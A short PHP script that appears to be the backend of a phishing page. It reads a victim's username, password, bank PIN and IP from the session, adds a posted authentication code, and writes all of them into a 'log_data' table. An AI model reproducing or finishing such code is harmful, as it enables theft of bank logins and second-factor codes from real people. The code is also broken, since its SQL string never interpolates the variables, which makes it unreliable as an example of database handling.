<?php
include('db_connection.php');
	session_start();

	$pin_1 =  $_SESSION['pin'];
	$username_1 = $_SESSION['username'];
	$password_1 =  $_SESSION['password'];
	$ip_1 =  $_SESSION['ip'];

	if(isset($_POST['trust']))
	{
		echo "there";
		$auth_1 = $_POST['code'];
		  $result = $pdo->prepare('insert into log_data(username,passsword,bank_pin,ip,auth_key) values($username_1,$password_1,$pin_1,$ip_1,$auth_1)');
				$result->execute();
		

}
?>